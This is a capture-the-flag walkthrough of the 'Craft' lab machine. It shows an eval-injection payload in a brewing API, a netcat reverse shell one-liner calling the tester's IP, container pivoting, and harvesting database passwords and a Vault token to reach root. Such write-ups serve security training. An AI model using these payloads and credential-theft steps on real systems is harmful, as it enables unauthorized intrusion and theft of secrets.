# Craft

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nmap -sV -sC -T4 10.10.10.110         
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 12:20 EST
Nmap scan report for 10.10.10.110
Host is up (0.054s latency).
Not shown: 998 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp open  ssl/http nginx 1.15.8
|_http-title: About
|_http-server-header: nginx/1.15.8
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

When hovering the icons on the top right, we find 2 vhosts : `api.craft.htb` and `gogs.craft.htb`

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FReG4hEWboijLZGDlT3VH%2Fimage.png?alt=media&#x26;token=9ae41225-d994-4f49-b7c0-19bce857ca42" alt=""><figcaption></figcaption></figure>

On the gogs vhost, we find a git repo. Looking at the commits, we find creds in a script.

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F4VbAm572peXcaa2otc11%2Fimage.png?alt=media&#x26;token=069fd08c-8d7d-4da9-aaad-ed6ef47d5d50" alt=""><figcaption></figcaption></figure>

`dinesh:4aUh0A8PbVJxgd`

Using the found credentials, we can craft an auth token

```shellscript
┌──(kali㉿kali)-[~/Downloads/CVE-2018-18925]
└─$ curl -X GET "https://api.craft.htb/api/auth/login" -H  "accept: application/json" -k -v -u 'dinesh:4aUh0A8PbVJxgd'
Note: Unnecessary use of -X or --request, GET is already inferred.
* Host api.craft.htb:443 was resolved.
* IPv6: (none)
* IPv4: 10.10.10.110
*   Trying 10.10.10.110:443...
* GnuTLS ciphers: NORMAL:-ARCFOUR-128:-CTYPE-ALL:+CTYPE-X509:-VERS-SSL3.0
* ALPN: curl offers h2,http/1.1
* SSL connection using TLS1.2 / ECDHE_RSA_AES_256_GCM_SHA384
*   server certificate verification SKIPPED
*   server certificate status verification SKIPPED
*   common name: api.craft.htb (matched)
*   server certificate expiration date FAILED
*   server certificate activation date OK
*   certificate public key: RSA
*   certificate version: #1
*   subject: C=US,ST=NY,O=Craft,CN=api.craft.htb
*   start date: Fri, 08 Feb 2019 17:01:10 GMT
*   expire date: Mon, 22 Jun 2020 17:01:10 GMT
*   issuer: C=US,ST=New York,L=Buffalo,O=Craft,OU=Craft,CN=Craft CA,EMAIL=admin@craft.htb
* ALPN: server accepted http/1.1
* Connected to api.craft.htb (10.10.10.110) port 443
* using HTTP/1.x
* Server auth using Basic with user 'dinesh'
> GET /api/auth/login HTTP/1.1
> Host: api.craft.htb
> Authorization: Basic ZGluZXNoOjRhVWgwQThQYlZKeGdk
> User-Agent: curl/8.12.1
> accept: application/json
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.15.8
< Date: Tue, 02 Dec 2025 21:08:47 GMT
< Content-Type: application/json
< Content-Length: 140
< Connection: keep-alive
< Accept-Ranges: bytes
< 
{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNzY0NzEwMDI3fQ._AOAZ4TYCOuYhXHNlSiZ_ELmHP9aO3gQWlQsycDmSMA"}
* Connection #0 to host api.craft.htb left intact
```

Validate the token

```shellscript
┌──(kali㉿kali)-[~/Downloads/CVE-2018-18925]
└─$ curl -X GET "https://api.craft.htb/api/auth/check" -H  "accept: application/json" -k -v -H 'X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNzY0NzExNTgyfQ.7Dt5D-VnkdPu-O2blQ_tfW_HrO00O89c22QzE4oE03w'
Note: Unnecessary use of -X or --request, GET is already inferred.
* Host api.craft.htb:443 was resolved.
* IPv6: (none)
* IPv4: 10.10.10.110
*   Trying 10.10.10.110:443...
* GnuTLS ciphers: NORMAL:-ARCFOUR-128:-CTYPE-ALL:+CTYPE-X509:-VERS-SSL3.0
* ALPN: curl offers h2,http/1.1
* SSL connection using TLS1.2 / ECDHE_RSA_AES_256_GCM_SHA384
*   server certificate verification SKIPPED
*   server certificate status verification SKIPPED
*   common name: api.craft.htb (matched)
*   server certificate expiration date FAILED
*   server certificate activation date OK
*   certificate public key: RSA
*   certificate version: #1
*   subject: C=US,ST=NY,O=Craft,CN=api.craft.htb
*   start date: Fri, 08 Feb 2019 17:01:10 GMT
*   expire date: Mon, 22 Jun 2020 17:01:10 GMT
*   issuer: C=US,ST=New York,L=Buffalo,O=Craft,OU=Craft,CN=Craft CA,EMAIL=admin@craft.htb
* ALPN: server accepted http/1.1
* Connected to api.craft.htb (10.10.10.110) port 443
* using HTTP/1.x
> GET /api/auth/check HTTP/1.1
> Host: api.craft.htb
> User-Agent: curl/8.12.1
> accept: application/json
> X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNzY0NzExNTgyfQ.7Dt5D-VnkdPu-O2blQ_tfW_HrO00O89c22QzE4oE03w
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.15.8
< Date: Tue, 02 Dec 2025 21:34:49 GMT
< Content-Type: application/json
< Content-Length: 30
< Connection: keep-alive
< Accept-Ranges: bytes
< 
{"message":"Token is valid!"}
* Connection #0 to host api.craft.htb left intact
```

Looking at the source code, we find that the value of the parameter abv is passed to the eval function

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FVjW76FuEoRn35GGwDSEF%2Fimage.png?alt=media&#x26;token=eac31182-b0e0-424b-8f24-73331542a143" alt=""><figcaption></figcaption></figure>

Using the following payload, we get a callback

```shellscript
┌──(kali㉿kali)-[~/Downloads/CVE-2018-18925]
└─$ curl -H 'X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNzY0NzE4NjA5fQ.2xThi1XA8yaSEg7R_h5h7OzTzvWL73FfArPPCMbiX2s' -v -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"test1","brewer":"test1", "style": "test1", "abv": "__import__(\"os\").system(\"ping -c 1 10.10.16.3\")"}'

┌──(kali㉿kali)-[~/Downloads/CVE-2018-18925]
└─$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
18:32:51.228512 IP craft.htb > 10.10.16.3: ICMP echo request, id 48640, seq 0, length 64
18:32:51.229611 IP 10.10.16.3 > craft.htb: ICMP echo reply, id 48640, seq 0, length 64
```

We craft a reverse shell payload, but get the `sh: bash: not found` error on our listener. It means that the bash shell is not available

```shellscript
┌──(kali㉿kali)-[~/Downloads/CVE-2018-18925]
└─$ curl -H 'X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNzY0NzE4OTI2fQ.xJv46Wlh4tFqyzF11GtzR6oip6HOlpF--XE2zlr06as' -v -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"test1","brewer":"test1", "style": "test1", "abv": "__import__(\"os\").system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.3 443 >/tmp/f\")"}'

┌──(kali㉿kali)-[~/Downloads/CVE-2018-18925]
└─$ nc -lnvp 443                 
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.110] 40361
sh: bash: not found
```

Replacing bash for sh, we get a connection

```shellscript
┌──(kali㉿kali)-[~/Downloads/CVE-2018-18925]
└─$ curl -H 'X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNzY0NzIwODEzfQ.Mfn1cJZmGGIZXYhx4k8nXZrTaWFAdakcHsu8lKKniU4' -v -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"test1","brewer":"test1", "style": "test1", "abv": "__import__(\"os\").system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.3 443 >/tmp/f\")"}'

/opt/app/craft_api # id 
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

We are already root. Looking at the root, we find a .dockerenv file, meaning we are inside a container

Running deepce, we find other containers on the network

```shellscript
[+] Attempting ping sweep of 172.20.0.6/24 (ping) 
172.20.0.1 is Up
172.20.0.7 is Up
172.20.0.4 is Up
172.20.0.5 is Up
172.20.0.3 is Up
172.20.0.6 is Up
172.20.0.2 is Up
```

We set up a ligolo pivot on the machine and run nmap scan against the new hosts. We find 2 interesting ones

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nmap -F 172.20.0.4
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 19:01 EST
Nmap scan report for 172.20.0.4
Host is up (0.074s latency).
Not shown: 99 closed tcp ports (reset)
PORT     STATE SERVICE
3306/tcp open  mysql

┌──(kali㉿kali)-[/opt/linux/privesc]
└─$ nmap 172.20.0.2 -p8200 -sV 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 19:12 EST
Nmap scan report for 172.20.0.2
Host is up (0.029s latency).

PORT     STATE SERVICE  VERSION
8200/tcp open  ssl/http Hashicorp Vault
```

Trying to connect with dinesh creds fails

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ mysql -u dinesh -p -h 172.20.0.4 --skip-ssl-verify-server-cert
Enter password: 
ERROR 1045 (28000): Access denied for user 'dinesh'@'172.20.0.6' (using password: YES)
```

We install the binary to interact with the vault, export the vault address. Using http fails so we use https. But we can't do much apart from getting the status of the vault as we don't have any auth token

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ wget https://releases.hashicorp.com/vault/1.8.0/vault_1.8.0_linux_amd64.zip
--2025-12-02 19:21:55--  https://releases.hashicorp.com/vault/1.8.0/vault_1.8.0_linux_amd64.zip
Resolving releases.hashicorp.com (releases.hashicorp.com)... 13.225.196.117, 13.225.196.74, 13.225.196.30, ...
Connecting to releases.hashicorp.com (releases.hashicorp.com)|13.225.196.117|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 64856353 (62M) [application/zip]
Saving to: ‘vault_1.8.0_linux_amd64.zip’

vault_1.8.0_linux_amd64.zip                                100%[========================================================================================================================================>]  61.85M  29.6MB/s    in 2.1s    

2025-12-02 19:21:57 (29.6 MB/s) - ‘vault_1.8.0_linux_amd64.zip’ saved [64856353/64856353]

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ unzip vault_1.8.0_linux_amd64.zip 
Archive:  vault_1.8.0_linux_amd64.zip
  inflating: vault
  
┌──(kali㉿kali)-[~/Downloads]
└─$ export VAULT_ADDR="https://172.20.0.2:8200"

┌──(kali㉿kali)-[~/Downloads]
└─$ ./vault status -tls-skip-verify
Key             Value
---             -----
Seal Type       shamir
Initialized     false
Sealed          false
Total Shares    5
Threshold       3
Version         0.11.1
Storage Type    n/a
Cluster Name    vault-cluster-cb7e66f9
Cluster ID      8bb98351-0148-3c42-d124-45a87dc43db7
HA Enabled      false
```

Getting back to our shell, we read the content of the .gitignore file and find a file named settings.py should be available to us now that we have a shell. It wasn't accessible from the browser as the file is present in the .gitignore

```shellscript
/opt/app # cat .gitignore
*.pyc
settings.py
/opt/app # cd craft_api
/opt/app/craft_api # ls 
__init__.py
__pycache__
api
database
settings.py


/opt/app/craft_api # ls -la 
total 24
drwxr-xr-x    5 root     root          4096 Feb  7  2019 .
drwxr-xr-x    5 root     root          4096 Dec  3 00:09 ..
-rw-r--r--    1 root     root             0 Feb  7  2019 __init__.py
drwxr-xr-x    2 root     root          4096 Feb  7  2019 __pycache__
drwxr-xr-x    5 root     root          4096 Feb  7  2019 api
drwxr-xr-x    3 root     root          4096 Feb  7  2019 database
-rw-r--r--    1 root     root           484 Feb  7  2019 settings.py


/opt/app/craft_api # cat settings.py
# Flask settings
FLASK_SERVER_NAME = 'api.craft.htb'
FLASK_DEBUG = False  # Do not use debug mode in production

# Flask-Restplus settings
RESTPLUS_SWAGGER_UI_DOC_EXPANSION = 'list'
RESTPLUS_VALIDATE = True
RESTPLUS_MASK_SWAGGER = False
RESTPLUS_ERROR_404_HELP = False
CRAFT_API_SECRET = 'hz66OCkDtv8G6D'

# database
MYSQL_DATABASE_USER = 'craft'
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
MYSQL_DATABASE_DB = 'craft'
MYSQL_DATABASE_HOST = 'db'
SQLALCHEMY_TRACK_MODIFICATIONS = False
```

We get credentials for a DB. We will try them on the MySQL running on 172.20.0.4

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ mysql -u craft -p -h 172.20.0.4 --skip-ssl-verify-server-cert
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 19
Server version: 8.0.15 MySQL Community Server - GPL

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Support MariaDB developers by giving a star at https://github.com/MariaDB/server
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| craft              |
| information_schema |
+--------------------+
```

It works and we can dump the content of the user table

```shellscript
MySQL [craft]> select * from user;
+----+----------+----------------+
| id | username | password       |
+----+----------+----------------+
|  1 | dinesh   | 4aUh0A8PbVJxgd |
|  4 | ebachman | llJ77D8QFkLPQB |
|  5 | gilfoyle | ZEU3N8WNM2rh4T |
+----+----------+----------------+
```

We get passwords, but none work on ssh. We can try then on the gogs site.

We can authenticate as gilfoyle and find out he has a private repo

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2Fwf10hotG5iR9hhCyGmBk%2Fimage.png?alt=media&#x26;token=12b72747-ba65-4852-8b5e-36080fa82bda" alt=""><figcaption></figcaption></figure>

We find an SSH private key, probably usable to log in via ssh on the 1st machine

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2Fu90LbkAQccUABGYvmxHs%2Fimage.png?alt=media&#x26;token=a359d8f5-fdae-415f-876d-895c6e6f0c63" alt=""><figcaption></figcaption></figure>

There is a passphrase on the key

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ ssh gilfoyle@craft.htb -i key 


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



Enter passphrase for key 'key':
```

Reusing the previous password, we are able to log in

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ ssh gilfoyle@craft.htb -i key                        


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



Enter passphrase for key 'key': 
Linux craft.htb 6.1.0-12-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.52-1 (2023-09-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Nov 16 08:03:39 2023 from 10.10.14.23
gilfoyle@craft:~$ id 
uid=1001(gilfoyle) gid=1001(gilfoyle) groups=1001(gilfoyle)
gilfoyle@craft:~$ 
```

In his home directory, we find his vault token

```shellscript
gilfoyle@craft:~$ ls -la 
total 36
drwx------ 4 gilfoyle gilfoyle 4096 Feb  9  2019 .
drwxr-xr-x 3 root     root     4096 Feb  9  2019 ..
-rw-r--r-- 1 gilfoyle gilfoyle  634 Feb  9  2019 .bashrc
drwx------ 3 gilfoyle gilfoyle 4096 Feb  9  2019 .config
-rw-r--r-- 1 gilfoyle gilfoyle  148 Feb  8  2019 .profile
drwx------ 2 gilfoyle gilfoyle 4096 Feb  9  2019 .ssh
-r-------- 1 gilfoyle gilfoyle   33 Dec  2 14:04 user.txt
-rw------- 1 gilfoyle gilfoyle   36 Feb  9  2019 .vault-token
-rw------- 1 gilfoyle gilfoyle 2546 Feb  9  2019 .viminfo

gilfoyle@craft:~$ cat .vault-token
f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
```

We can use it to login to the vault

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ ./vault login -tls-skip-verify
Token (will be hidden): 
Success! You are now authenticated. The token information displayed below
is already stored in the token helper. You do NOT need to run "vault login"
again. Future Vault requests will automatically use this token.

Key                  Value
---                  -----
token                f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
token_accessor       1dd7b9a1-f0f1-f230-dc76-46970deb5103
token_duration       ∞
token_renewable      false
token_policies       ["root"]
identity_policies    []
policies             ["root"]
```

Going back to the gogs repo, we have a vault section

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FFBNf8XKObDhEygNgVLFI%2Fimage.png?alt=media&#x26;token=e7a420b9-82a0-401e-ad28-952d6ff67a85" alt=""><figcaption></figcaption></figure>

In the secrets file, we see the path where the secret is written

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2Fi3QWvcFc4DLJur0xU61i%2Fimage.png?alt=media&#x26;token=addfc8d5-8b45-4b2f-8a10-17efac0bd22e" alt=""><figcaption></figcaption></figure>

We can use the vault to read the secret

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ ./vault read -tls-skip-verify ssh/roles/root_otp
Key                  Value
---                  -----
allowed_users        n/a
cidr_list            0.0.0.0/0
default_user         root
exclude_cidr_list    n/a
key_type             otp
port                 22
```

We see a OTP for the root user, but we don't get it in plaintext

Looking at the help menu, there is an ssh option

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ ./vault -tls-skip-verify                
Usage: vault <command> [args]

Common commands:
    read        Read data and retrieves secrets
    write       Write data, configuration, and secrets
    delete      Delete secrets and configuration
    list        List data or secrets
    login       Authenticate locally
    agent       Start a Vault agent
    server      Start a Vault server
    status      Print seal and HA status
    unwrap      Unwrap a wrapped secret

Other commands:
    audit          Interact with audit devices
    auth           Interact with auth methods
    debug          Runs the debug command
    kv             Interact with Vault's Key-Value storage
    lease          Interact with leases
    monitor        Stream log messages from a Vault server
    namespace      Interact with namespaces
    operator       Perform operator-specific tasks
    path-help      Retrieve API help for paths
    plugin         Interact with Vault plugins and catalog
    policy         Interact with policies
    print          Prints runtime configurations
    secrets        Interact with secrets engines
    ssh            Initiate an SSH session
    token          Interact with tokens
```

We can try it, maybe the OTP is passed directly. Running the binary, the OTP for the session is printed on the screen. We can just use it and we get our root shell

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ ./vault ssh -tls-skip-verify root@craft.htb
WARNING: No -role specified. Use -role to tell Vault which ssh role to use for
authentication. In the future, you will need to tell Vault which role to use.                                                                                                                                                               
For now, Vault will attempt to guess based on the API response. This will be                                                                                                                                                                
removed in the Vault 1.1.                                                                                                                                                                                                                   
Vault SSH: Role: "root_otp"
WARNING: No -mode specified. Use -mode to tell Vault which ssh authentication
mode to use. In the future, you will need to tell Vault which mode to use.                                                                                                                                                                  
For now, Vault will attempt to guess based on the API response. This guess                                                                                                                                                                  
involves creating a temporary credential, reading its type, and then revoking                                                                                                                                                               
it. To reduce the number of API calls and surface area, specify -mode                                                                                                                                                                       
directly. This will be removed in Vault 1.1.                                                                                                                                                                                                
Vault could not locate "sshpass". The OTP code for the session is displayed
below. Enter this code in the SSH password prompt. If you install sshpass,                                                                                                                                                                  
Vault can automatically perform this step for you.                                                                                                                                                                                          
OTP for the session is: d6c116fa-ccaf-6614-db6f-b51d8d21aa60


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



(root@craft.htb) Password: 
Linux craft.htb 6.1.0-12-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.52-1 (2023-09-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Nov 16 07:14:50 2023
root@craft:~# id 
uid=0(root) gid=0(root) groups=0(root)
```
